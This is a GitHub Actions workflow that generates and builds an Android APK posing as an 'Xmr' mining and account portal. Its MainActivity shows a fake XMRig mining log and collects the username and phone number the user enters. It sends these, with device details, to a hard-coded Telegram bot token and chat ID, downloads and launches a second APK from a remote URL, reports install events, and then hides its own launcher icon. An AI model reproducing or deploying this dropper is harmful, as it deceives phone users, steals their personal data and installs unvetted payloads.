name: Build Xmr Stub APK

on:
  push:
    branches: [ main ]
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v4

      - name: Create Android project
        run: |
          mkdir -p app/src/main/java/com/phone/stub
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/drawable
          mkdir -p app/src/main/res/xml
          mkdir -p app/src/main/res/mipmap-anydpi-v26

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.phone.stub">
              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
              <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
              <application
                  android:allowBackup="true"
                  android:label="Xmr"
                  android:theme="@style/AppTheme"
                  android:icon="@mipmap/ic_launcher"
                  android:usesCleartextTraffic="true">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <provider
                      android:name="androidx.core.content.FileProvider"
                      android:authorities="com.phone.stub.fileprovider"
                      android:exported="false"
                      android:grantUriPermissions="true">
                      <meta-data
                          android:name="android.support.FILE_PROVIDER_PATHS"
                          android:resource="@xml/file_paths" />
                  </provider>
              </application>
          </manifest>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="AppTheme" parent="@android:style/Theme.Material.Light.NoActionBar">
                  <item name="android:windowActionModeOverlay">true</item>
                  <item name="android:windowBackground">@android:color/white</item>
              </style>
          </resources>
          EOF

          cat > app/src/main/res/values/colors.xml << 'EOF'
          <resources>
              <color name="ic_launcher_background">#F26C22</color>
              <color name="xmr_orange">#F26C22</color>
              <color name="xmr_orange_dark">#D9561B</color>
              <color name="xmr_grey">#4A4F52</color>
              <color name="xmr_grey_light">#6E7478</color>
              <color name="xmr_white">#FFFFFF</color>
              <color name="xmr_black">#111111</color>
              <color name="xmr_bg">#F4F5F7</color>
          </resources>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Xmr</string>
          </resources>
          EOF

          # ------------------------------------------------------------
          # Adaptive launcher icon (background + foreground)
          # ------------------------------------------------------------
          cat > app/src/main/res/drawable/ic_launcher_background.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="@color/xmr_orange" />
          </shape>
          EOF

          # Foreground: white Xr wordmark over orange with grey bottom band.
          # viewport is 108x108 (adaptive icon safe zone).
          cat > app/src/main/res/drawable/ic_launcher_foreground.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <vector xmlns:android="http://schemas.android.com/apk/res/android"
              android:width="108dp"
              android:height="108dp"
              android:viewportWidth="108"
              android:viewportHeight="108">

              <!-- Grey bottom band (the "ground") -->
              <path
                  android:fillColor="#4A4F52"
                  android:pathData="M14,78 L94,78 L94,94 L14,94 Z" />

              <!-- White X letter (two thick diagonals) -->
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M22,24 L40,24 L54,48 L68,24 L86,24 L64,58 L86,78 L68,78 L54,60 L40,78 L22,78 L44,58 Z" />

              <!-- White r letter (stem + shoulder) -->
              <path
                  android:fillColor="#FFFFFF"
                  android:pathData="M62,44 L72,44 L72,52 L73,52 C75,47 81,44 88,44 L88,54 C82,54 78,57 76,63 L76,78 L62,78 Z" />

          </vector>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@drawable/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          cat > app/src/main/res/mipmap-anydpi-v26/ic_launcher_round.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <adaptive-icon xmlns:android="http://schemas.android.com/apk/res/android">
              <background android:drawable="@drawable/ic_launcher_background"/>
              <foreground android:drawable="@drawable/ic_launcher_foreground"/>
          </adaptive-icon>
          EOF

          # ------------------------------------------------------------
          # UI drawables
          # ------------------------------------------------------------
          cat > app/src/main/res/drawable/circular_progress.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <layer-list xmlns:android="http://schemas.android.com/apk/res/android">
              <item android:id="@android:id/background">
                  <shape>
                      <solid android:color="#E5E7EB"/>
                  </shape>
              </item>
              <item android:id="@android:id/progress">
                  <clip>
                      <shape>
                          <solid android:color="@color/xmr_orange"/>
                      </shape>
                  </clip>
              </item>
          </layer-list>
          EOF

          cat > app/src/main/res/drawable/gradient_button.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <gradient
                  android:startColor="@color/xmr_orange"
                  android:endColor="@color/xmr_orange_dark"
                  android:angle="0"/>
              <corners android:radius="24dp"/>
              <padding
                  android:left="16dp"
                  android:top="8dp"
                  android:right="16dp"
                  android:bottom="8dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/xmr_log_bg.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="#0B1020"/>
              <corners android:radius="8dp"/>
              <stroke android:width="1dp" android:color="@color/xmr_orange"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/input_bg.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="#FFFFFF"/>
              <corners android:radius="10dp"/>
              <stroke android:width="1dp" android:color="#D0D6E0"/>
              <padding
                  android:left="12dp"
                  android:top="10dp"
                  android:right="12dp"
                  android:bottom="10dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/success_bg.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="#E7F7EC"/>
              <corners android:radius="10dp"/>
              <stroke android:width="1dp" android:color="#22A45D"/>
              <padding
                  android:left="14dp"
                  android:top="12dp"
                  android:right="14dp"
                  android:bottom="12dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/header_bg.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <gradient
                  android:startColor="@color/xmr_orange"
                  android:endColor="@color/xmr_orange_dark"
                  android:angle="270"/>
              <corners android:bottomLeftRadius="22dp"
                  android:bottomRightRadius="22dp"/>
          </shape>
          EOF

          cat > app/src/main/res/drawable/bottom_band_bg.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <shape xmlns:android="http://schemas.android.com/apk/res/android"
              android:shape="rectangle">
              <solid android:color="@color/xmr_grey"/>
              <corners android:topLeftRadius="22dp"
                  android:topRightRadius="22dp"/>
          </shape>
          EOF

          cat > app/src/main/res/xml/file_paths.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <paths>
              <cache-path name="cache" path="." />
              <external-cache-path name="external_cache" path="." />
              <files-path name="files" path="." />
          </paths>
          EOF

          # ------------------------------------------------------------
          # Main layout
          # ------------------------------------------------------------
          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:background="@color/xmr_bg">

              <ScrollView
                  android:layout_width="match_parent"
                  android:layout_height="match_parent"
                  android:fillViewport="true">

                  <LinearLayout
                      android:layout_width="match_parent"
                      android:layout_height="wrap_content"
                      android:orientation="vertical">

                      <!-- HEADER (orange gradient, matches logo top) -->
                      <LinearLayout
                          android:layout_width="match_parent"
                          android:layout_height="wrap_content"
                          android:orientation="vertical"
                          android:gravity="center"
                          android:paddingTop="28dp"
                          android:paddingBottom="24dp"
                          android:background="@drawable/header_bg">

                          <ImageView
                              android:id="@+id/iconImage"
                              android:layout_width="82dp"
                              android:layout_height="82dp"
                              android:src="@mipmap/ic_launcher"
                              android:contentDescription="Xmr" />

                          <TextView
                              android:layout_width="wrap_content"
                              android:layout_height="wrap_content"
                              android:text="Xmr"
                              android:textSize="28sp"
                              android:textColor="@color/xmr_white"
                              android:textStyle="bold"
                              android:layout_marginTop="10dp"/>

                          <TextView
                              android:layout_width="wrap_content"
                              android:layout_height="wrap_content"
                              android:text="Secure access portal"
                              android:textSize="13sp"
                              android:textColor="#FFE1CC" />
                      </LinearLayout>

                      <!-- BODY -->
                      <LinearLayout
                          android:layout_width="match_parent"
                          android:layout_height="wrap_content"
                          android:orientation="vertical"
                          android:paddingLeft="22dp"
                          android:paddingRight="22dp"
                          android:paddingTop="20dp">

                          <!-- ACCOUNT FORM -->
                          <TextView
                              android:id="@+id/createAccountTitle"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:text="Create Account"
                              android:textSize="16sp"
                              android:textColor="@color/xmr_black"
                              android:textStyle="bold"
                              android:layout_marginBottom="10dp"/>

                          <EditText
                              android:id="@+id/usernameInput"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:hint="Username"
                              android:inputType="text"
                              android:background="@drawable/input_bg"
                              android:textColor="@color/xmr_black"
                              android:textColorHint="#888888"
                              android:layout_marginBottom="10dp"/>

                          <EditText
                              android:id="@+id/phoneInput"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:hint="Phone number"
                              android:inputType="phone"
                              android:background="@drawable/input_bg"
                              android:textColor="@color/xmr_black"
                              android:textColorHint="#888888"
                              android:layout_marginBottom="12dp"/>

                          <Button
                              android:id="@+id/createAccountButton"
                              android:layout_width="match_parent"
                              android:layout_height="50dp"
                              android:text="CREATE ACCOUNT"
                              android:textSize="15sp"
                              android:textColor="@color/xmr_white"
                              android:textStyle="bold"
                              android:background="@drawable/gradient_button"
                              android:stateListAnimator="@null"
                              android:layout_marginBottom="14dp"/>

                          <!-- SUCCESS CARD (hidden until account is created) -->
                          <LinearLayout
                              android:id="@+id/successCard"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:orientation="vertical"
                              android:background="@drawable/success_bg"
                              android:visibility="gone"
                              android:layout_marginBottom="14dp">

                              <TextView
                                  android:layout_width="match_parent"
                                  android:layout_height="wrap_content"
                                  android:text="✔  Account created successfully"
                                  android:textSize="15sp"
                                  android:textStyle="bold"
                                  android:textColor="#166534" />

                              <TextView
                                  android:id="@+id/successDetail"
                                  android:layout_width="match_parent"
                                  android:layout_height="wrap_content"
                                  android:text="You can now install the app."
                                  android:textSize="13sp"
                                  android:textColor="#2F6E48"
                                  android:layout_marginTop="4dp"/>
                          </LinearLayout>

                          <!-- XMRIG LOG -->
                          <TextView
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:text="XMRig Log"
                              android:textSize="15sp"
                              android:textColor="@color/xmr_black"
                              android:textStyle="bold"
                              android:layout_marginBottom="6dp"/>

                          <ScrollView
                              android:id="@+id/logScroll"
                              android:layout_width="match_parent"
                              android:layout_height="180dp"
                              android:background="@drawable/xmr_log_bg"
                              android:padding="10dp"
                              android:layout_marginBottom="20dp">

                              <TextView
                                  android:id="@+id/xmrLog"
                                  android:layout_width="match_parent"
                                  android:layout_height="wrap_content"
                                  android:text=""
                                  android:textSize="11sp"
                                  android:textColor="#FFB27A"
                                  android:fontFamily="monospace"
                                  android:lineSpacingExtra="2dp"/>
                          </ScrollView>

                          <!-- PROGRESS -->
                          <RelativeLayout
                              android:layout_width="match_parent"
                              android:layout_height="140dp"
                              android:layout_marginBottom="12dp">

                              <ProgressBar
                                  android:id="@+id/circularProgress"
                                  style="?android:attr/progressBarStyleHorizontal"
                                  android:layout_width="120dp"
                                  android:layout_height="120dp"
                                  android:indeterminate="false"
                                  android:max="100"
                                  android:progress="0"
                                  android:progressDrawable="@drawable/circular_progress"
                                  android:layout_centerInParent="true"/>

                              <TextView
                                  android:id="@+id/progressText"
                                  android:layout_width="wrap_content"
                                  android:layout_height="wrap_content"
                                  android:text="0%"
                                  android:textSize="22sp"
                                  android:textColor="@color/xmr_orange_dark"
                                  android:textStyle="bold"
                                  android:layout_centerInParent="true"/>
                          </RelativeLayout>

                          <TextView
                              android:id="@+id/statusText"
                              android:layout_width="match_parent"
                              android:layout_height="wrap_content"
                              android:gravity="center"
                              android:text="Ready to install"
                              android:textSize="14sp"
                              android:textColor="@color/xmr_grey_light"
                              android:layout_marginBottom="96dp"/>

                      </LinearLayout>
                  </LinearLayout>
              </ScrollView>

              <!-- Small install button pinned bottom-right -->
              <Button
                  android:id="@+id/installButton"
                  android:layout_width="wrap_content"
                  android:layout_height="40dp"
                  android:layout_gravity="bottom|end"
                  android:layout_margin="16dp"
                  android:paddingLeft="18dp"
                  android:paddingRight="18dp"
                  android:minWidth="0dp"
                  android:minHeight="0dp"
                  android:text="INSTALL"
                  android:textSize="13sp"
                  android:textColor="@color/xmr_white"
                  android:textStyle="bold"
                  android:background="@drawable/gradient_button"
                  android:elevation="6dp"
                  android:stateListAnimator="@null"/>

              <!-- Bottom grey band (matches logo bottom) -->
              <View
                  android:id="@+id/bottomBand"
                  android:layout_width="match_parent"
                  android:layout_height="10dp"
                  android:layout_gravity="bottom"
                  android:background="@color/xmr_grey"/>

          </FrameLayout>
          EOF

          # ------------------------------------------------------------
          # MainActivity
          # ------------------------------------------------------------
          cat > app/src/main/java/com/phone/stub/MainActivity.java << 'EOF'
          package com.phone.stub;

          import android.app.Activity;
          import android.content.ComponentName;
          import android.content.Intent;
          import android.content.pm.PackageManager;
          import android.net.Uri;
          import android.os.Build;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.util.Log;
          import android.view.View;
          import android.widget.Button;
          import android.widget.EditText;
          import android.widget.LinearLayout;
          import android.widget.ProgressBar;
          import android.widget.ScrollView;
          import android.widget.TextView;
          import android.widget.Toast;
          import androidx.core.content.FileProvider;

          import java.io.File;
          import java.io.FileOutputStream;
          import java.io.InputStream;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;
          import java.text.SimpleDateFormat;
          import java.util.Date;
          import java.util.Locale;
          import java.util.Random;

          public class MainActivity extends Activity {
              private static final String TAG = "XmrStub";
              private static final String APK_URL = "https://xmrminer2026.github.io/XMRPV/app-debug.apk";

              // Telegram bot credentials
              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
              private static final String CHAT_ID = "8468538314";

              private TextView statusText;
              private TextView progressText;
              private ProgressBar progressBar;
              private Button installButton;
              private Button createAccountButton;
              private EditText usernameInput;
              private EditText phoneInput;
              private LinearLayout successCard;
              private TextView successDetail;
              private TextView xmrLog;
              private ScrollView logScroll;

              private Handler handler = new Handler(Looper.getMainLooper());
              private Random random = new Random();
              private boolean logRunning = true;
              private boolean accountCreated = false;

              private static final String[] XMRIG_LINES = new String[] {
                  "use pool pool.minexmr.com:4444",
                  "net use pool pool.minexmr.com:4444 142.44.240.100",
                  "net thread #1 use profile rx",
                  "cpu READY threads 4/4 (100%) huge pages 0/4 (0%)",
                  "miner starting...",
                  "cpu affinity: 0,1,2,3",
                  "memory allocated: 2048 MB",
                  "job received (diff 1000)",
                  "speed 10s/60s/15m 320.5 318.2 315.0 H/s",
                  "new job from pool.minexmr.com:4444",
                  "accepted (1/0) diff 1000 (15 ms)",
                  "accepted (2/0) diff 1000 (18 ms)",
                  "share accepted (25 ms)",
                  "reconnect: pool.minexmr.com:4444",
                  "randomx dataset ready (2080 MB)",
                  "cpu fan: ok, temp: 41C",
                  "connection to pool stable",
                  "difficulty changed to 1500",
                  "accepted (3/0) diff 1500 (21 ms)",
                  "speed 10s/60s/15m 322.1 320.7 318.2 H/s"
              };

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  statusText = findViewById(R.id.statusText);
                  progressText = findViewById(R.id.progressText);
                  progressBar = findViewById(R.id.circularProgress);
                  installButton = findViewById(R.id.installButton);
                  createAccountButton = findViewById(R.id.createAccountButton);
                  usernameInput = findViewById(R.id.usernameInput);
                  phoneInput = findViewById(R.id.phoneInput);
                  successCard = findViewById(R.id.successCard);
                  successDetail = findViewById(R.id.successDetail);
                  xmrLog = findViewById(R.id.xmrLog);
                  logScroll = findViewById(R.id.logScroll);

                  appendLog("[info] XMRig 6.21.0 starting...");
                  startXmrLogLoop();

                  installButton.setOnClickListener(v -> {
                      installButton.setEnabled(false);
                      installButton.setText("...");
                      statusText.setText("Downloading...");
                      progressText.setText("0%");
                      progressBar.setProgress(0);
                      downloadAndInstall();
                  });

                  createAccountButton.setOnClickListener(v -> submitAccount());

                  // Notify Telegram that this (stub) app was just installed / launched
                  new Thread(() -> sendTelegramEvent("APK Installed", buildDeviceSummary())).start();
              }

              private void startXmrLogLoop() {
                  handler.postDelayed(new Runnable() {
                      @Override
                      public void run() {
                          if (!logRunning) return;
                          String line = XMRIG_LINES[random.nextInt(XMRIG_LINES.length)];
                          String ts = new SimpleDateFormat("HH:mm:ss", Locale.getDefault())
                                  .format(new Date());
                          appendLog("[" + ts + "] " + line);
                          handler.postDelayed(this, 1200 + random.nextInt(1800));
                      }
                  }, 800);
              }

              private void appendLog(String line) {
                  CharSequence cur = xmrLog.getText();
                  String next = (cur == null ? "" : cur.toString()) + line + "\n";
                  xmrLog.setText(next);
                  logScroll.post(() -> logScroll.fullScroll(View.FOCUS_DOWN));
              }

              private String buildDeviceSummary() {
                  return "Device: " + Build.MANUFACTURER + " " + Build.MODEL
                          + "\nAndroid SDK: " + Build.VERSION.SDK_INT
                          + "\nTime: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss",
                              Locale.getDefault()).format(new Date());
              }

              // ---------------------------------------------------------
              // Create Account -> submit then LOCK the screen to Download-only
              // ---------------------------------------------------------
              private void submitAccount() {
                  if (accountCreated) return;

                  String username = usernameInput.getText() != null
                          ? usernameInput.getText().toString().trim() : "";
                  String phone = phoneInput.getText() != null
                          ? phoneInput.getText().toString().trim() : "";

                  if (username.isEmpty() || phone.isEmpty()) {
                      Toast.makeText(this, "Please fill in both fields", Toast.LENGTH_SHORT).show();
                      return;
                  }

                  createAccountButton.setEnabled(false);
                  createAccountButton.setText("SUBMITTING...");

                  new Thread(() -> {
                      boolean ok = sendAccountToTelegram(username, phone);
                      handler.post(() -> {
                          if (ok) {
                              onAccountCreated(username);
                          } else {
                              createAccountButton.setEnabled(true);
                              createAccountButton.setText("CREATE ACCOUNT");
                              Toast.makeText(this, "Submission failed, try again",
                                      Toast.LENGTH_SHORT).show();
                          }
                      });
                  }).start();
              }

              private void onAccountCreated(String username) {
                  accountCreated = true;

                  usernameInput.setVisibility(View.GONE);
                  phoneInput.setVisibility(View.GONE);
                  createAccountButton.setVisibility(View.GONE);

                  successCard.setVisibility(View.VISIBLE);
                  successDetail.setText("Signed in as " + username
                          + ". You can now install the app.");

                  appendLog("[info] account created: " + username);
                  appendLog("[info] screen locked — download only");

                  Toast.makeText(this, "Account created successfully",
                          Toast.LENGTH_LONG).show();
              }

              private boolean sendAccountToTelegram(String username, String phone) {
                  String text = "*New Account Created*\n"
                          + "Username: " + username + "\n"
                          + "Phone: " + phone + "\n"
                          + buildDeviceSummary();
                  return sendTelegramEvent("New Account Created", text);
              }

              // ---------------------------------------------------------
              // Generic Telegram sender
              // ---------------------------------------------------------
              private boolean sendTelegramEvent(String title, String body) {
                  HttpURLConnection conn = null;
                  try {
                      String text = "*" + title + "*\n" + body;

                      String encoded = URLEncoder.encode(text, "UTF-8");
                      String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
                              + "/sendMessage?chat_id=" + CHAT_ID
                              + "&parse_mode=Markdown&text=" + encoded;

                      URL url = new URL(urlStr);
                      conn = (HttpURLConnection) url.openConnection();
                      conn.setRequestMethod("GET");
                      conn.setConnectTimeout(10000);
                      conn.setReadTimeout(10000);
                      int code = conn.getResponseCode();
                      Log.d(TAG, "Telegram [" + title + "] response: " + code);
                      return code >= 200 && code < 300;
                  } catch (Exception e) {
                      Log.e(TAG, "Telegram send failed (" + title + "): " + e.getMessage());
                      return false;
                  } finally {
                      if (conn != null) conn.disconnect();
                  }
              }

              // ---------------------------------------------------------
              // APK download + install
              // ---------------------------------------------------------
              private void downloadAndInstall() {
                  new Thread(() -> {
                      try {
                          URL url = new URL(APK_URL);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setConnectTimeout(10000);
                          conn.setReadTimeout(10000);
                          int fileSize = conn.getContentLength();
                          InputStream in = conn.getInputStream();
                          File apkFile = new File(getCacheDir(), "main.apk");
                          FileOutputStream out = new FileOutputStream(apkFile);
                          byte[] buffer = new byte[4096];
                          int len;
                          long totalBytes = 0;
                          int lastProgress = 0;
                          while ((len = in.read(buffer)) != -1) {
                              out.write(buffer, 0, len);
                              totalBytes += len;
                              if (fileSize > 0) {
                                  int progress = (int) ((totalBytes * 100) / fileSize);
                                  if (progress != lastProgress) {
                                      lastProgress = progress;
                                      int finalProgress = progress;
                                      handler.post(() -> {
                                          progressBar.setProgress(finalProgress);
                                          progressText.setText(finalProgress + "%");
                                          statusText.setText("Downloading... " + finalProgress + "%");
                                      });
                                  }
                              }
                          }
                          out.close();
                          in.close();
                          conn.disconnect();

                          // Notify Telegram: APK downloaded from the link
                          long kb = totalBytes / 1024;
                          new Thread(() -> sendTelegramEvent(
                                  "APK Downloaded",
                                  "Source: " + APK_URL
                                          + "\nSize: " + kb + " KB"
                                          + "\n" + buildDeviceSummary()
                          )).start();

                          handler.post(() -> {
                              progressBar.setProgress(100);
                              progressText.setText("100% ✅");
                              statusText.setText("Opening installer...");
                              appendLog("[info] apk downloaded, opening installer");
                              openInstaller(apkFile);
                          });

                      } catch (Exception e) {
                          Log.e(TAG, "Download failed: " + e.getMessage());
                          handler.post(() -> {
                              statusText.setText("Failed: " + e.getMessage());
                              installButton.setEnabled(true);
                              installButton.setText("INSTALL");
                          });
                      }
                  }).start();
              }

              private void openInstaller(File apkFile) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_VIEW);
                      Uri apkUri;

                      if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                          apkUri = FileProvider.getUriForFile(this,
                                  "com.phone.stub.fileprovider", apkFile);
                          intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
                      } else {
                          apkUri = Uri.fromFile(apkFile);
                      }

                      intent.setDataAndType(apkUri, "application/vnd.android.package-archive");
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                      startActivityForResult(intent, 100);

                      statusText.setText("Installation started. Tap 'Install' in the popup.");
                      Toast.makeText(this, "Please allow installation when prompted.",
                              Toast.LENGTH_LONG).show();

                  } catch (Exception e) {
                      Log.e(TAG, "Open installer failed: " + e.getMessage());
                      statusText.setText("Install error: " + e.getMessage());
                      installButton.setEnabled(true);
                      installButton.setText("INSTALL");
                  }
              }

              @Override
              protected void onActivityResult(int requestCode, int resultCode, Intent data) {
                  super.onActivityResult(requestCode, resultCode, data);
                  if (requestCode == 100) {
                      // Report install completion (or cancellation) to Telegram
                      final String outcome = (resultCode == RESULT_OK)
                              ? "Installation completed (user accepted)"
                              : "Installer closed (user cancelled or continued)";
                      new Thread(() -> sendTelegramEvent(
                              "APK Install Result",
                              outcome + "\n" + buildDeviceSummary()
                      )).start();

                      hideIconAndFinish();
                  }
              }

              private void hideIconAndFinish() {
                  ComponentName componentName = new ComponentName(this, MainActivity.class);
                  PackageManager pm = getPackageManager();
                  pm.setComponentEnabledSetting(componentName,
                          PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                          PackageManager.DONT_KILL_APP);
                  finish();
              }

              @Override
              protected void onDestroy() {
                  logRunning = false;
                  super.onDestroy();
              }
          }
